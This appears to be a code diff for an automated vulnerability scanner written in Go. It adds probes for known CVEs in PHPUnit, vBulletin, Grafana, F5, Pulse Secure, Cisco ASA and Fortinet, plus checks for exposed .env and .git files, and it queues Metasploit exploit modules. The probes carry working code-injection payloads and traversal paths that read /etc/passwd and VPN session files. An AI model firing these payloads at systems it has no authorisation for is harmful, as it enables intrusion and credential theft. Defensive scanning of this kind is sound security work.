@@ -33,12 +33,13 @@ import (
 	"time"
 
 	"auto-bughunter/backend/internal/model"
+	"auto-bughunter/backend/internal/safety"
 	"auto-bughunter/backend/internal/scanner"
 )
 
 // metasploitNativeProbeCount is the number of native Go probe functions called
 // in MetasploitAgent.Run. Update this constant whenever a probe is added or removed.
-const metasploitNativeProbeCount = 14
+const metasploitNativeProbeCount = 23
 
 // MetasploitAgent orchestrates Metasploit-based web exploit checks.
 type MetasploitAgent struct {
@@ -86,6 +87,15 @@ func (a *MetasploitAgent) Run(ctx context.Context, input AgentInput) (AgentOutpu
 	output.Findings = append(output.Findings, probeThinkPHPRCE(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probeExchangeProxyLogon(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probeWebAssemblyModuleAbuse(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probePHPUnitEvalStdinRCE(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeGrafanaPluginTraversal(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeVBulletinWidgetTemplateRCE(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeF5BIGIPTMUITraversal(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probePulseSecureFileDisclosure(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeCiscoASAPathTraversal(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeFortinetSSLVPNFileRead(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeDotEnvFileExposure(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeGitConfigExposure(ctx, client, input.Target, input.AuthProfile)...)
 
 	// ── Phase 2: Metasploit RPC (optional, when msfrpcd is reachable) ─────
 	msfURL := strings.TrimSpace(os.Getenv("MSF_RPC_URL"))
@@ -797,6 +807,565 @@ func probeWebAssemblyModuleAbuse(ctx context.Context, client *http.Client, targe
 	}}
 }
 
+// probePHPUnitEvalStdinRCE probes exposed PHPUnit eval-stdin endpoint
+// (CVE-2017-9841) with a deterministic harmless echo marker.
+func probePHPUnitEvalStdinRCE(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	endpoints := []string{
+		"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+		"/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
+		"/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+	}
+	marker := "abh_phpunit_probe_5f4dcc3b5aa765d61d8327deb882cf99"
+	payload := "<?php echo '" + marker + "'; ?>"
+
+	for _, ep := range endpoints {
+		probeURL := base + ep
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodPost, probeURL, strings.NewReader(payload))
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		if resp.StatusCode == http.StatusOK && strings.Contains(bodyLower, strings.ToLower(marker)) {
+			return []model.Finding{{
+				ID:              "msf-phpunit-eval-stdin",
+				Category:        "remote_code_execution",
+				Severity:        model.SeverityHigh,
+				Title:           "PHPUnit eval-stdin.php RCE indicator (CVE-2017-9841)",
+				Description:     "The publicly reachable PHPUnit eval-stdin endpoint executed supplied input and returned a deterministic marker. This behavior is consistent with unauthenticated remote code execution exposure.",
+				Evidence:        fmt.Sprintf("endpoint=%s status=%d marker_reflected=true", ep, resp.StatusCode),
+				Recommendation:  "Remove development dependencies (vendor/phpunit) from production builds, deny public access to /vendor paths, and rotate secrets that may have been exposed.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A06:2021 - Vulnerable and Outdated Components",
+				CWE:             "CWE-94",
+				CVSSScore:       9.8,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+				MITRETechniques: []string{"T1190", "T1059.006"},
+				ReproductionSteps: []string{
+					fmt.Sprintf("curl -s -X POST '%s' -d %q", probeURL, payload),
+					"Observe the deterministic marker in the response body",
+				},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
+					"https://www.rapid7.com/db/modules/exploit/unix/http/phpunit_eval_stdin/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probeGrafanaPluginTraversal checks for Grafana plugin path traversal exposure
+// (CVE-2021-43798) via known plugin asset traversal paths.
+func probeGrafanaPluginTraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/public/plugins/alertlist/../../../../../../../../etc/passwd",
+		"/public/plugins/annolist/../../../../../../../../etc/passwd",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+
+		if resp.StatusCode == http.StatusOK && strings.Contains(strings.ToLower(string(body)), "root:x:0:0:") {
+			return []model.Finding{{
+				ID:              "msf-grafana-plugin-traversal",
+				Category:        "path_traversal",
+				Severity:        model.SeverityHigh,
+				Title:           "Grafana plugin path traversal indicator (CVE-2021-43798)",
+				Description:     "Grafana's plugin asset endpoint returned /etc/passwd content through directory traversal sequences, indicating a path traversal vulnerability that can expose sensitive files.",
+				Evidence:        fmt.Sprintf("path=%s status=%d passwd_signature=true", p, resp.StatusCode),
+				Recommendation:  "Upgrade Grafana to a patched release and restrict access to public plugin asset routes. Apply upstream mitigations and verify no sensitive files are accessible via traversal.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       7.5,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+				MITRETechniques: []string{"T1190", "T1083"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2021-43798",
+					"https://www.rapid7.com/db/modules/auxiliary/scanner/http/grafana_plugin_traversal/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probeVBulletinWidgetTemplateRCE probes vBulletin widget template rendering
+// endpoint (CVE-2019-16759) with a harmless marker echo payload.
+func probeVBulletinWidgetTemplateRCE(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	endpoint := base + "/ajax/render/widget_tabbedcontainer_tab_panel"
+	marker := "abh_vbulletin_probe_a8d9f16b"
+
+	form := url.Values{}
+	form.Set("subWidgets[0][template]", "widget_php")
+	form.Set("subWidgets[0][config][code]", "echo '"+marker+"';")
+	form.Set("routestring", "ajax/render/widget_tabbedcontainer_tab_panel")
+
+	if err := validateMetasploitProbeTarget(endpoint); err != nil {
+		return nil
+	}
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, strings.NewReader(form.Encode()))
+	if err != nil {
+		return nil
+	}
+	scanner.ApplyAuthProfile(req, profile)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil
+	}
+	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+	resp.Body.Close()
+	bodyLower := strings.ToLower(string(body))
+
+	if resp.StatusCode == http.StatusOK && strings.Contains(bodyLower, strings.ToLower(marker)) {
+		return []model.Finding{{
+			ID:              "msf-vbulletin-widget-template-rce",
+			Category:        "remote_code_execution",
+			Severity:        model.SeverityHigh,
+			Title:           "vBulletin widget template RCE indicator (CVE-2019-16759)",
+			Description:     "The vBulletin widget rendering endpoint executed supplied template code and returned a deterministic marker, indicating remote code execution exposure.",
+			Evidence:        fmt.Sprintf("endpoint=%s status=%d marker_reflected=true", endpoint, resp.StatusCode),
+			Recommendation:  "Upgrade vBulletin to a fixed version immediately, disable vulnerable AJAX widget rendering paths, and restrict unauthenticated access to administrative/template features.",
+			AffectedURL:     endpoint,
+			OWASPCategory:   "OWASP A03:2021 - Injection",
+			CWE:             "CWE-94",
+			CVSSScore:       9.8,
+			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+			MITRETechniques: []string{"T1190", "T1059.007"},
+			References: []string{
+				"https://nvd.nist.gov/vuln/detail/CVE-2019-16759",
+				"https://www.rapid7.com/db/modules/exploit/unix/http/vbulletin_widget_template_rce/",
+			},
+		}}
+	}
+	return nil
+}
+
+// probeF5BIGIPTMUITraversal tests for F5 BIG-IP TMUI file read exposure
+// (CVE-2020-5902) through known fileRead.jsp traversal payloads.
+func probeF5BIGIPTMUITraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+		"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		leakDetected := strings.Contains(bodyLower, "root:x:0:0:") || strings.Contains(bodyLower, "localhost")
+		if resp.StatusCode == http.StatusOK && leakDetected {
+			return []model.Finding{{
+				ID:              "msf-f5-bigip-tmui-traversal",
+				Category:        "path_traversal",
+				Severity:        model.SeverityHigh,
+				Title:           "F5 BIG-IP TMUI file read indicator (CVE-2020-5902)",
+				Description:     "The BIG-IP TMUI fileRead endpoint returned local file content via a traversal sequence, indicating CVE-2020-5902 exposure that can lead to configuration theft and potential remote code execution.",
+				Evidence:        fmt.Sprintf("path=%s status=%d leak_detected=true", p, resp.StatusCode),
+				Recommendation:  "Upgrade BIG-IP to a patched release and restrict management interface access to trusted networks only. Apply vendor mitigation guidance for TMUI exposure immediately.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       9.8,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+				MITRETechniques: []string{"T1190", "T1005"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2020-5902",
+					"https://www.rapid7.com/db/modules/exploit/linux/http/f5_bigip_tmui_rce/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probePulseSecureFileDisclosure tests for Pulse Secure arbitrary file read
+// (CVE-2019-11510) by requesting a known traversal path.
+func probePulseSecureFileDisclosure(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/dana-na/../dana/html5acc/guacamole/../../../../../../../../etc/passwd",
+		"/dana-na/../dana/html5acc/guacamole/../../../../../../../../etc/hosts",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		leakDetected := strings.Contains(bodyLower, "root:x:0:0:") || strings.Contains(bodyLower, "localhost")
+		if resp.StatusCode == http.StatusOK && leakDetected {
+			return []model.Finding{{
+				ID:              "msf-pulse-secure-file-disclosure",
+				Category:        "path_traversal",
+				Severity:        model.SeverityHigh,
+				Title:           "Pulse Secure arbitrary file read indicator (CVE-2019-11510)",
+				Description:     "The Pulse Secure appliance exposed local file content through a traversal path under /dana-na, indicating CVE-2019-11510 and possible credential/session theft risk.",
+				Evidence:        fmt.Sprintf("path=%s status=%d leak_detected=true", p, resp.StatusCode),
+				Recommendation:  "Apply Ivanti/Pulse Secure patches immediately and rotate VPN credentials and session material that may have been exposed.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       10.0,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+				MITRETechniques: []string{"T1190", "T1005"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2019-11510",
+					"https://www.rapid7.com/db/vulnerabilities/pulse-secure-vpn-cve-2019-11510/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probeCiscoASAPathTraversal tests for Cisco ASA/FTD clientless SSL VPN
+// directory traversal (CVE-2020-3452) using known translation-table endpoints.
+func probeCiscoASAPathTraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua",
+		"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session_password.html",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		leakDetected := strings.Contains(bodyLower, "webvpn") ||
+			strings.Contains(bodyLower, "portal_inc") ||
+			strings.Contains(bodyLower, "session_password") ||
+			strings.Contains(bodyLower, "root:x:0:0:")
+		if resp.StatusCode == http.StatusOK && leakDetected {
+			return []model.Finding{{
+				ID:              "msf-cisco-asa-path-traversal",
+				Category:        "path_traversal",
+				Severity:        model.SeverityHigh,
+				Title:           "Cisco ASA clientless VPN path traversal indicator (CVE-2020-3452)",
+				Description:     "The Cisco ASA translation-table endpoint returned sensitive local resource content, indicating CVE-2020-3452 exposure in clientless SSL VPN components.",
+				Evidence:        fmt.Sprintf("path=%s status=%d leak_detected=true", p, resp.StatusCode),
+				Recommendation:  "Upgrade Cisco ASA/FTD to a fixed version and disable or restrict clientless SSL VPN access from untrusted networks.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       8.6,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+				MITRETechniques: []string{"T1190", "T1005"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2020-3452",
+					"https://www.rapid7.com/db/vulnerabilities/cisco-asa-cve-2020-3452/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probeFortinetSSLVPNFileRead tests for Fortinet SSL VPN credential/session
+// disclosure via traversal on fgt_lang (CVE-2018-13379).
+func probeFortinetSSLVPNFileRead(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+		"/remote/fgt_lang?lang=/../../../..//////////etc/passwd",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		leakDetected := strings.Contains(bodyLower, "sslvpn_websession") ||
+			strings.Contains(bodyLower, "var fgt_lang") ||
+			strings.Contains(bodyLower, "root:x:0:0:")
+		if resp.StatusCode == http.StatusOK && leakDetected {
+			return []model.Finding{{
+				ID:              "msf-fortinet-sslvpn-file-read",
+				Category:        "path_traversal",
+				Severity:        model.SeverityHigh,
+				Title:           "Fortinet SSL VPN file disclosure indicator (CVE-2018-13379)",
+				Description:     "The Fortinet SSL VPN language endpoint returned sensitive file/session content through traversal, indicating CVE-2018-13379 exposure.",
+				Evidence:        fmt.Sprintf("path=%s status=%d leak_detected=true", p, resp.StatusCode),
+				Recommendation:  "Patch FortiOS immediately and rotate VPN credentials/session material potentially exposed by the vulnerability.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       9.8,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+				MITRETechniques: []string{"T1190", "T1005"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2018-13379",
+					"https://www.rapid7.com/db/modules/auxiliary/gather/fortios_vpnssl_traversal_creds_leak/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probeDotEnvFileExposure checks for accidental disclosure of environment files.
+func probeDotEnvFileExposure(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{"/.env", "/app/.env", "/config/.env"}
+
+	for _, p := range paths {
+		probeURL := base + p
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyStr := strings.ToLower(string(body))
+		if resp.StatusCode == http.StatusOK &&
+			(strings.Contains(bodyStr, "app_key=") ||
+				strings.Contains(bodyStr, "database_url=") ||
+				strings.Contains(bodyStr, "aws_secret_access_key")) {
+			return []model.Finding{{
+				ID:             "msf-dotenv-file-exposure",
+				Category:       "information_disclosure",
+				Severity:       model.SeverityHigh,
+				Title:          "Exposed .env file detected",
+				Description:    "The application appears to expose an environment file containing sensitive runtime configuration and credentials.",
+				Evidence:       fmt.Sprintf("path=%s status=%d sensitive_markers_detected=true", p, resp.StatusCode),
+				Recommendation: "Block public access to .env files at the web server layer, rotate exposed credentials, and store secrets in a dedicated secrets manager.",
+				AffectedURL:    probeURL,
+				OWASPCategory:  "OWASP A01:2021 - Broken Access Control",
+				CWE:            "CWE-200",
+				References: []string{
+					"https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probeGitConfigExposure checks whether .git/config is web-accessible.
+func probeGitConfigExposure(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	probeURL := base + "/.git/config"
+	if !envFlagTrue("ABH_ALLOW_LOCAL_TARGETS") {
+		if err := safety.ValidateOutboundURL(probeURL); err != nil {
+			return nil
+		}
+	}
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+	if err != nil {
+		return nil
+	}
+	scanner.ApplyAuthProfile(req, profile)
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil
+	}
+	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+	resp.Body.Close()
+	bodyStr := strings.ToLower(string(body))
+	if resp.StatusCode == http.StatusOK &&
+		strings.Contains(bodyStr, "[core]") &&
+		strings.Contains(bodyStr, "repositoryformatversion") {
+		return []model.Finding{{
+			ID:             "msf-git-config-exposure",
+			Category:       "information_disclosure",
+			Severity:       model.SeverityHigh,
+			Title:          "Exposed Git repository metadata (.git/config)",
+			Description:    "The target exposes repository metadata via /.git/config, indicating source-control directory disclosure that can lead to full source code leakage.",
+			Evidence:       fmt.Sprintf("path=/.git/config status=%d git_markers_detected=true", resp.StatusCode),
+			Recommendation: "Deny access to /.git and related SCM metadata paths at the web server/proxy layer, then rotate any secrets that may have been exposed in repository history.",
+			AffectedURL:    probeURL,
+			OWASPCategory:  "OWASP A01:2021 - Broken Access Control",
+			CWE:            "CWE-200",
+			References: []string{
+				"https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
+			},
+		}}
+	}
+	return nil
+}
+
+func validateMetasploitProbeTarget(target string) error {
+	if strings.EqualFold(strings.TrimSpace(os.Getenv("ABH_ALLOW_LOCAL_TARGETS")), "true") {
+		return nil
+	}
+	return safety.ValidateOutboundURL(target)
+}
+
 // ── Metasploit RPC ────────────────────────────────────────────────────────────
 
 // msfRPCResponse is the minimal shape returned by msfrpcd JSON-RPC calls.
@@ -806,6 +1375,57 @@ type msfRPCResponse struct {
 	Error   bool                   `json:"error"`
 	Message string                 `json:"message"`
 	Data    map[string]interface{} `json:"data"`
+}
+
+type msfRPCModuleTemplate struct {
+	Name     string            `json:"name"`
+	Title    string            `json:"title"`
+	CVE      string            `json:"cve,omitempty"`
+	LessSafe bool              `json:"lessSafe,omitempty"`
+	Options  map[string]string `json:"options"`
+}
+
+func envFlagTrue(key string) bool {
+	value := strings.TrimSpace(strings.ToLower(os.Getenv(key)))
+	return value == "1" || value == "true" || value == "yes" || value == "on"
+}
+
+func loadMSFRPCModuleTemplate(path, rhost, rport, ssl string) ([]msfRPCModuleTemplate, error) {
+	raw, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	var modules []msfRPCModuleTemplate
+	if err := json.Unmarshal(raw, &modules); err != nil {
+		return nil, err
+	}
+	replacer := strings.NewReplacer(
+		"{{RHOSTS}}", rhost,
+		"{{RPORT}}", rport,
+		"{{SSL}}", ssl,
+		"{{TARGETURI}}", "/",
+	)
+	for i := range modules {
+		if modules[i].Options == nil {
+			modules[i].Options = map[string]string{}
+		}
+		if _, ok := modules[i].Options["RHOSTS"]; !ok {
+			modules[i].Options["RHOSTS"] = "{{RHOSTS}}"
+		}
+		if _, ok := modules[i].Options["RPORT"]; !ok {
+			modules[i].Options["RPORT"] = "{{RPORT}}"
+		}
+		if _, ok := modules[i].Options["SSL"]; !ok {
+			modules[i].Options["SSL"] = "{{SSL}}"
+		}
+		for k, v := range modules[i].Options {
+			modules[i].Options[k] = replacer.Replace(v)
+		}
+		if modules[i].Title == "" {
+			modules[i].Title = modules[i].Name
+		}
+	}
+	return modules, nil
 }
 
 // runMSFRPCModules authenticates to msfrpcd, runs a curated set of web
@@ -839,6 +1459,10 @@ func runMSFRPCModules(ctx context.Context, client *http.Client, rpcURL, password
 	if u.Scheme == "https" {
 		ssl = "true"
 	}
+	allowLessSafe := envFlagTrue("MSF_RPC_ENABLE_LESS_SAFE_MODULES")
+	templatePath := strings.TrimSpace(os.Getenv("MSF_RPC_MODULE_TEMPLATE_FILE"))
+	customLoaded := 0
+	customLoadErr := ""
 
 	// ── 3. Module set — web auxiliary modules that are safe to run ─────────
 	modules := []struct {
@@ -913,6 +1537,119 @@ func runMSFRPCModules(ctx context.Context, client *http.Client, rpcURL, password
 			cve:     "",
 			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
 		},
+		{
+			name:    "exploit/unix/http/phpunit_eval_stdin",
+			title:   "PHPUnit eval-stdin.php RCE (CVE-2017-9841)",
+			cve:     "CVE-2017-9841",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
+		},
+		{
+			name:    "auxiliary/scanner/http/grafana_plugin_traversal",
+			title:   "Grafana Plugin Path Traversal (CVE-2021-43798)",
+			cve:     "CVE-2021-43798",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "exploit/unix/http/vbulletin_widget_template_rce",
+			title:   "vBulletin Widget Template RCE (CVE-2019-16759)",
+			cve:     "CVE-2019-16759",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
+		},
+		{
+			name:    "exploit/linux/http/f5_bigip_tmui_rce",
+			title:   "F5 BIG-IP TMUI RCE (CVE-2020-5902)",
+			cve:     "CVE-2020-5902",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/gather/pulse_secure_file_disclosure",
+			title:   "Pulse Secure File Disclosure (CVE-2019-11510)",
+			cve:     "CVE-2019-11510",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/scanner/http/cisco_asa_path_traversal",
+			title:   "Cisco ASA Path Traversal (CVE-2020-3452)",
+			cve:     "CVE-2020-3452",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/gather/fortios_vpnssl_traversal_creds_leak",
+			title:   "Fortinet SSL VPN Traversal Credential Leak (CVE-2018-13379)",
+			cve:     "CVE-2018-13379",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/scanner/http/http_version",
+			title:   "HTTP Version & Banner Fingerprinting",
+			cve:     "",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/scanner/http/options",
+			title:   "HTTP OPTIONS Method Exposure",
+			cve:     "",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/scanner/http/dir_scanner",
+			title:   "Common Sensitive Path Discovery",
+			cve:     "",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+	}
+	// lessSafeModules are opt-in exploit modules that may have side effects
+	// (service instability, data mutation, or payload execution attempts).
+	// They are disabled by default and only enabled when
+	// MSF_RPC_ENABLE_LESS_SAFE_MODULES is explicitly true.
+	lessSafeModules := []struct {
+		name    string
+		options map[string]string
+		title   string
+		cve     string
+	}{
+		{
+			name:    "exploit/multi/http/struts2_content_type_ognl",
+			title:   "Apache Struts2 Content-Type OGNL RCE (CVE-2017-5638)",
+			cve:     "CVE-2017-5638",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
+		},
+		{
+			name:    "exploit/multi/http/apache_ofbiz_deserialization",
+			title:   "Apache OFBiz Deserialization RCE (CVE-2020-9496)",
+			cve:     "CVE-2020-9496",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl, "TARGETURI": "/"},
+		},
+	}
+	if allowLessSafe {
+		modules = append(modules, lessSafeModules...)
+	}
+	if templatePath != "" {
+		customModules, err := loadMSFRPCModuleTemplate(templatePath, rhost, rport, ssl)
+		if err != nil {
+			customLoadErr = err.Error()
+		} else {
+			for _, mod := range customModules {
+				if mod.Name == "" {
+					continue
+				}
